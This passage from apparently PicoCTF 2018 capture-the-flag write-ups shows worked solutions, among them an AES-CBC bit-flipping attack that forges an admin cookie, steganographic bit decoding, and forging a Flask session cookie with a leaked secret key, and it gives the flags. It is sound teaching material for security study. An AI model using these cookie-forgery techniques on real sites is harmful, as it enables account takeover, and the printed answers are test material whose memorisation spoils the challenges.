    <span class="n">cookie</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">cookie</span><span class="p">[</span><span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">cookie</span><span class="p">)</span>
    <span class="n">cookie_data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">encrypted</span> <span class="o">=</span> <span class="nc">AESCipher</span><span class="p">(</span><span class="n">app</span><span class="p">.</span><span class="n">secret_key</span><span class="p">).</span><span class="nf">encrypt</span><span class="p">(</span><span class="n">cookie_data</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
    <span class="n">resp</span><span class="p">.</span><span class="nf">set_cookie</span><span class="p">(</span><span class="sh">'</span><span class="s">cookie</span><span class="sh">'</span><span class="p">,</span> <span class="n">encrypted</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">resp</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/logout</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="nf">make_response</span><span class="p">(</span><span class="nf">redirect</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">))</span>
    <span class="n">resp</span><span class="p">.</span><span class="nf">set_cookie</span><span class="p">(</span><span class="sh">'</span><span class="s">cookie</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">,</span> <span class="n">expires</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">resp</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/flag</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
  <span class="k">try</span><span class="p">:</span>
      <span class="n">encrypted</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">[</span><span class="sh">'</span><span class="s">cookie</span><span class="sh">'</span><span class="p">]</span>
  <span class="k">except</span> <span class="nb">KeyError</span><span class="p">:</span>
      <span class="nf">flash</span><span class="p">(</span><span class="sh">"</span><span class="s">Error: Please log-in again.</span><span class="sh">"</span><span class="p">)</span>
      <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">main</span><span class="sh">'</span><span class="p">))</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nc">AESCipher</span><span class="p">(</span><span class="n">app</span><span class="p">.</span><span class="n">secret_key</span><span class="p">).</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

  <span class="k">try</span><span class="p">:</span>
     <span class="n">check</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">]</span>
  <span class="k">except</span> <span class="nb">KeyError</span><span class="p">:</span>
     <span class="n">check</span> <span class="o">=</span> <span class="mi">0</span>
  <span class="k">if</span> <span class="n">check</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
      <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">flag.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="n">flag_value</span><span class="p">)</span>
  <span class="nf">flash</span><span class="p">(</span><span class="sh">"</span><span class="s">Success: You logged in! Not sure you</span><span class="sh">'</span><span class="s">ll be able to see the flag though.</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">success</span><span class="sh">"</span><span class="p">)</span>
  <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">not-flag.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">cookie</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">AESCipher</span><span class="p">:</span>
    <span class="sh">"""</span><span class="s">
    Usage:
        c = AESCipher(</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="s">).encrypt(</span><span class="sh">'</span><span class="s">message</span><span class="sh">'</span><span class="s">)
        m = AESCipher(</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="s">).decrypt(c)
    Tested under Python 3 and PyCrypto 2.6.1.
    </span><span class="sh">"""</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="nf">md5</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf8</span><span class="sh">'</span><span class="p">)).</span><span class="nf">hexdigest</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">raw</span><span class="p">):</span>
        <span class="n">raw</span> <span class="o">=</span> <span class="nf">pad</span><span class="p">(</span><span class="n">raw</span><span class="p">)</span>
        <span class="n">iv</span> <span class="o">=</span> <span class="n">Random</span><span class="p">.</span><span class="nf">new</span><span class="p">().</span><span class="nf">read</span><span class="p">(</span><span class="n">AES</span><span class="p">.</span><span class="n">block_size</span><span class="p">)</span>
        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">b64encode</span><span class="p">(</span><span class="n">iv</span> <span class="o">+</span> <span class="n">cipher</span><span class="p">.</span><span class="nf">encrypt</span><span class="p">(</span><span class="n">raw</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">enc</span><span class="p">):</span>
        <span class="n">enc</span> <span class="o">=</span> <span class="nf">b64decode</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
        <span class="n">iv</span> <span class="o">=</span> <span class="n">enc</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span>
        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">enc</span><span class="p">[</span><span class="mi">16</span><span class="p">:])).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf8</span><span class="sh">'</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">()</span>
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>AES in CBC mode is vulnerable to <a href="https://masterpessimistaa.wordpress.com/2017/05/03/cbc-bit-flipping-attack/">bitflipping attacks</a>.</p><p>We log into the site, and get a cookie and its plaintext:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>Cookie:
plaintext: {'admin': 0, 'password': 'bla', 'username': 'bla'}
encrypted: 0dAX+nusd7/rVAVbq0ih0tZaLUn3mZYXOfnyMCJdzzJjvu8cPgiP/3C8CKgAOjblGU1Pijpg2qG0hqDcJ3yaZA==
</pre></table></code></div></div><p><img src="writeupfiles/bitflipping1.png" alt="" /></p><p><img src="writeupfiles/bitflipping2.jpg" alt="" /></p><p>Our goals is to change the <code class="language-plaintext highlighter-rouge">0</code> in the admin variable to a <code class="language-plaintext highlighter-rouge">1</code> (in the source code we see that this will get us our flag).</p><p>We want to change the byte in position 10 (11th character) of the plaintext, which would involve changing the corresponding<br /> byte in the block before it in the ciphertext (byte number 8), but since this scheme uses a 16-bit IV, which is prepended<br /> to the ciphertext, we need to edit the byte in position 10 of the ciphertext as well. We want to change this from a <code class="language-plaintext highlighter-rouge">0</code> to<br /> a <code class="language-plaintext highlighter-rouge">1</code>, so we XOR this byte of the ciphertext with the XOR of these two values (<code class="language-plaintext highlighter-rouge">'0' XOR '1' = 0x01</code>):</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="gp">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="n">base64</span>
<span class="gp">&gt;&gt;&gt;</span> <span class="nf">hex</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">)</span><span class="o">^</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">))</span>
<span class="sh">'</span><span class="s">0x1</span><span class="sh">'</span>
<span class="gp">&gt;&gt;&gt;</span> <span class="n">c</span> <span class="o">=</span> <span class="sh">'</span><span class="s">0dAX+nusd7/rVAVbq0ih0tZaLUn3mZYXOfnyMCJdzzJjvu8cPgiP/3C8CKgAOjblGU1Pijpg2qG0hqDcJ3yaZA==</span><span class="sh">'</span>
<span class="gp">&gt;&gt;&gt;</span> <span class="n">d</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt;</span> <span class="n">d</span>
<span class="sa">b</span><span class="sh">'</span><span class="se">\xd1\xd0\x17\xfa</span><span class="s">{</span><span class="se">\xac</span><span class="s">w</span><span class="se">\xbf\xeb</span><span class="s">T</span><span class="se">\x05</span><span class="s">[</span><span class="se">\xab</span><span class="s">H</span><span class="se">\xa1\xd2\xd6</span><span class="s">Z-I</span><span class="se">\xf7\x99\x96\x17</span><span class="s">9</span><span class="se">\xf9\xf2</span><span class="s">0</span><span class="sh">"</span><span class="s">]</span><span class="se">\xcf</span><span class="s">2c</span><span class="se">\xbe\xef\x1c</span><span class="s">&gt;</span><span class="se">\x08\x8f\xff</span><span class="s">p</span><span class="se">\xbc\x08\xa8\x00</span><span class="s">:6</span><span class="se">\xe5\x19</span><span class="s">MO</span><span class="se">\x8a</span><span class="s">:`</span><span class="se">\xda\xa1\xb4\x86\xa0\xdc\'</span><span class="s">|</span><span class="se">\x9a</span><span class="s">d</span><span class="sh">'</span>
<span class="gp">&gt;&gt;&gt;</span> <span class="nf">hex</span><span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="mi">10</span><span class="p">])</span>
<span class="sh">'</span><span class="se">\x05</span><span class="sh">'</span>
<span class="gp">&gt;&gt;&gt;</span> <span class="nf">hex</span><span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0x01</span><span class="p">)</span>
<span class="sh">'</span><span class="se">\x04</span><span class="sh">'</span>
<span class="gp">&gt;&gt;&gt;</span> <span class="n">new</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xd1\xd0\x17\xfa</span><span class="s">{</span><span class="se">\xac</span><span class="s">w</span><span class="se">\xbf\xeb</span><span class="s">T</span><span class="se">\x04</span><span class="s">[</span><span class="se">\xab</span><span class="s">H</span><span class="se">\xa1\xd2\xd6</span><span class="s">Z-I</span><span class="se">\xf7\x99\x96\x17</span><span class="s">9</span><span class="se">\xf9\xf2</span><span class="s">0</span><span class="sh">"</span><span class="s">]</span><span class="se">\xcf</span><span class="s">2c</span><span class="se">\xbe\xef\x1c</span><span class="s">&gt;</span><span class="se">\x08\x8f\xff</span><span class="s">p</span><span class="se">\xbc\x08\xa8\x00</span><span class="s">:6</span><span class="se">\xe5\x19</span><span class="s">MO</span><span class="se">\x8a</span><span class="s">:`</span><span class="se">\xda\xa1\xb4\x86\xa0\xdc\'</span><span class="s">|</span><span class="se">\x9a</span><span class="s">d</span><span class="sh">'</span>
<span class="gp">&gt;&gt;&gt;</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
<span class="sa">b</span><span class="sh">'</span><span class="s">0dAX+nusd7/rVARbq0ih0tZaLUn3mZYXOfnyMCJdzzJjvu8cPgiP/3C8CKgAOjblGU1Pijpg2qG0hqDcJ3yaZA==</span><span class="sh">'</span>
</pre></table></code></div></div><p>We change our cookie to this value and get our flag!</p><p><img src="writeupfiles/securelogon_flag.png" alt="" /></p><h2> Flag</h2><code> picoCTF{fl1p_4ll_th3_bit3_a6396679} </code><hr><h1 id="general-skills-500-script-me"> General Skills 500: script me <a href="/CTF-writeups-public/writeups/PicoCTF_2018/83-general-skills-500-script-me.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p>Can you understand the language and answer the questions to retrieve the flag?</p><p>Connect to the service with <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 1542</code></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="forensics-550-loadsomebits"> Forensics 550: LoadSomeBits <a href="/CTF-writeups-public/writeups/PicoCTF_2018/84-forensics-550-loadsomebits.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Can you find the flag encoded inside this image? You can also find the file in /problems/loadsomebits_1_5ccf71e5726692c713405bb17da5cb37 on the shell server.</p><p><img src="writeupfiles/pico2018-special-logo.bmp" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>r: 0100100001111000111111000001010000011101010001011001110010011101010111001100010010011101011110010000110100001001000111000
g: 0011001110111110101110000011111110110001101011110010101110101001000100011010111100101001101101010011001110110111001011100
b: 0010011100010001100101011010011110100100011101110110001110100010011001011001011100100100010101001010011001110100001001000
</pre></table></code></div></div><p>target:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>picoCTF{ : 01110000 01101001 01100011 01101111 01000011 01010100 01000110 01111011
</pre></table></code></div></div><p>We don’t know what the ordering or interpretation of these bits is. Turning each string into ascii (with sliding windows) shows no useful interpretation of any single string, therefore these are interleaved.</p><p>After trying to decode the various permutations we find that <code class="language-plaintext highlighter-rouge">bgr</code> is the correct ordering to interleave the bits.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">binascii</span>

<span class="c1"># The bytes we found in the image
</span><span class="n">r</span> <span class="o">=</span> <span class="sh">'</span><span class="s">0010010000111100011111100000101000001110101000101100111001001110101011100110001001001110101111001000011010000100100011100</span><span class="sh">'</span>
<span class="n">g</span> <span class="o">=</span> <span class="sh">'</span><span class="s">0001100111011111010111000001111111011000110101111001010111010100100010001101011110010100110110101001100111011011100101110</span><span class="sh">'</span>
<span class="n">b</span> <span class="o">=</span> <span class="sh">'</span><span class="s">0001001110001000110010101101001111010010001110111011000111010001001100101100101110010010001010100101001100111010000100100</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">rotate</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">offset</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">q</span> <span class="o">=</span> <span class="sh">'</span><span class="s">0b</span><span class="sh">'</span> <span class="o">+</span> <span class="n">s</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">q</span> <span class="o">=</span> <span class="sh">'</span><span class="s">0b</span><span class="sh">'</span> <span class="o">+</span> <span class="p">(</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span> <span class="o">*</span> <span class="n">offset</span><span class="p">)</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="o">-</span><span class="n">offset</span><span class="p">]</span>
    <span class="n">q</span> <span class="o">=</span> <span class="sh">"</span><span class="s">{0:088x}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">q</span>

<span class="k">def</span> <span class="nf">interleave</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">a</span><span class="p">)):</span>
        <span class="k">yield</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
        <span class="k">yield</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
        <span class="k">yield</span> <span class="n">c</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

<span class="c1"># Convert a1a2a3, b1b2b3, c1c2c3 into a1b1c1a2b2c2a3b3c3
</span><span class="n">d</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">interleave</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">r</span><span class="p">))</span>

<span class="c1"># Find a rotation (given the hint)
</span><span class="n">q</span> <span class="o">=</span> <span class="nf">rotate</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">:</span><span class="mi">88</span><span class="p">]</span>

<span class="c1"># Convert to string and print out
</span><span class="n">w</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="nf">unhexlify</span><span class="p">(</span><span class="n">q</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="se">\r</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
</pre></table></code></div></div><p>We don’t seem to have grabbed all of the bits of the flag for some reason and only see</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>r3d_iN_tH3_l345t_s1gn1f1c4nT_b1t5_882756901}
</pre></table></code></div></div><p>But we can guess that it’s ‘stored’:</p><h2> Flag</h2><code> picoCTF{st0r3d_iN_tH3_l345t_s1gn1f1c4nT_b1t5_882756901} </code><hr><h1 id="reversing-550-assembly-4"> Reversing 550: assembly-4 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/85-reversing-550-assembly-4.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> Can you find the flag using the following <a href="./writeupfiles/comp.nasm">assembly source</a>? WARNING: It is VERY long…</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>They give us enough to compile it, so, we just do that. Most online compilers<br /> are x64 for some reason, so compiling locally is a bit easier:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>$ nasm -f elf32 comp.nasm
$ gcc -m32 comp.o -o comp
$ ./comp
picoCTF{1_h0p3_y0u_c0mP1l3d_tH15_94698637933
</pre></table></code></div></div><p>There’s some garbage at the end, just add a <code class="language-plaintext highlighter-rouge">}</code> and remove digits until it goes<br /> through. I don’t know when precisely it went through but it’s something like<br /> that.</p><h2> Flag</h2><code> picoCTF{1_h0p3_y0u_c0mP1l3d_tH15_94698637933 </code><hr><h1 id="web-exploitation-600-flaskcards-skeleton-key"> Web Exploitation 600: Flaskcards Skeleton key <a href="/CTF-writeups-public/writeups/PicoCTF_2018/86-web-exploitation-600-flaskcards-skeleton-key.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Nice! You found out they were sending the Secret_key: <code class="language-plaintext highlighter-rouge">385c16dd09098b011d0086f9e218a0a2</code>.<br /> Now, can you find a way to log in as admin? http://2018shell1.picoctf.com:48263</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We find our session cookie</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>.eJwlj8uKwzAMAP_F5xxsvSL3Z4JsSWwp7ELSnkr_vYa9z8DMuxx5xvVTbs_zFVs57l5uxRwDe6Vahcl2Ms0KXMUoh6I7IgE0HcSufYoKx0DHXcOYwKlPlkRAi-GZqYCcjEkBOVO7GUwOttaWbHtomzarTfLWxapj2cq8zjyef4_4XT0LVhBpwIyqMnqb3HRXRKUBoqQ-Vkwu73XF-T_Ravl8Aa_JPmw.DrIbMQ.mLvNGriozmsC4ufO9lqGP44D340
</pre></table></code></div></div><p>and learn a bit about how flask deals with session cookies:</p><ul><li>https://www.kirsle.net/wizards/flask-session.cgi<li>https://stackoverflow.com/questions/22463939/demystify-flask-app-secret-key#22463969<li>https://pythonhosted.org/itsdangerous/</ul><p>We also find <a href="https://github.com/noraj/flask-session-cookie-manager">this tool</a> to help us (also in this repo <a href="writeupfiles/flask_session_cookie_manager.py">here</a>)</p><p>We use this to decode our existing cookie:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python flask_session_cookie_manager.py decode <span class="nt">-c</span> <span class="s1">'.eJwlj8uKwzAMAP_F5xxsvSL3Z4JsSWwp7ELSnkr_vYa9z8DMuxx5xvVTbs_zFVs57l5uxRwDe6Vahcl2Ms0KXMUoh6I7IgE0HcSufYoKx0DHXcOYwKlPlkRAi-GZqYCcjEkBOVO7GUwOttaWbHtomzarTfLWxapj2cq8zjyef4_4XT0LVhBpwIyqMnqb3HRXRKUBoqQ-Vkwu73XF-T_Ravl8Aa_JPmw.DrIbMQ.mLvNGriozmsC4ufO9lqGP44D340
'</span>
<span class="o">{</span><span class="s2">"_fresh"</span>:true,<span class="s2">"_id"</span>:<span class="s2">"ad3e390400654a74a8f02506a4fb83dd3342218b45d89c6865eb3d378ea542d49c56f323aebdfff8235f53f4e2fcf89aa2c5e5a119c6a7e81cac0ac4d196a0d3"</span>,<span class="s2">"csrf_token"</span>:<span class="s2">"5e5826612553886b91c518783384b26848dbb45f"</span>,<span class="s2">"user_id"</span>:<span class="s2">"10"</span><span class="o">}</span>
</pre></table></code></div></div><p>Then change the <code class="language-plaintext highlighter-rouge">user_id</code> to <code class="language-plaintext highlighter-rouge">1</code> and encode it using our secret key:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python flask_session_cookie_manager.py encode <span class="nt">-s</span> <span class="s1">'385c16dd09098b011d0086f9e218a0a2'</span> <span class="nt">-t</span> <span class="s1">'{"_fresh":True,"_id":"ad3e390400654a74a8f02506a4fb83dd3342218b45d89c6865eb3d378ea542d49c56f323aebdfff8235f53f4e2fcf89aa2c5e5a119c6a7e81cac0ac4d196a0d3","csrf_token":"5e5826612553886b91c518783384b26848dbb45f","user_id":"1"}'</span>
.eJxNUM-LgkAU_leWOXdIVy9Ch2BmxeC9wRiTNxdhzcyn04IV5UT_-1qHZQ_f5YPv50NUh7E5H0VyGa_NQlTdXiQP8fEtEkFl7q2BGGR-A0kBpupzRmR5PaFZh2S2jrj1Ns09-HwCVhFxHljZxuQpQt4NxNiDryNbqgDlpkc5MBrrwGeeyl1nU-sstxP4nUODDtNisg6dlsORzIaxLAIy6q5LmPP2g5ZfTCXcZiytVDE6dbMSVuK5EPV5PFSXn745_U14ybXMQmQ1Vy68lm1I3N_JF3ct6wg8RJhmE3K71Om2e9dvV2-767kZ_98B-Yt__gJ85WQf.W9GuEQ.aDVMvmgmVLaXgfOrCbP6QnJCppQ
</pre></table></code></div></div><p>we set our cookie in the browser and find the flag on the admin page:</p><p><img src="writeupfiles/flaskcards_admin.png" alt="" /></p><h2> Flag</h2><code> picoCTF{1_id_to_rule_them_all_d77c1ed6} </code><hr><h1 id="web-exploitation-600-help-me-reset"> Web Exploitation 600: Help Me Reset <a href="/CTF-writeups-public/writeups/PicoCTF_2018/87-web-exploitation-600-help-me-reset.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>There is a website running at http://2018shell1.picoctf.com:54584 (link). We need to get into any user for a flag!</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img src="writeupfiles/helpmereset_ss.png" alt="" /></p><p>There is a login page and a password reset page. Judging by the title, this is where we need to look, but it asks for<br /> a username, and we get an error if we enter a non-existing username. So we need to find a username first, hmm..</p><p>We look at the html source for the main page, and find this comment:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>[..]
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>
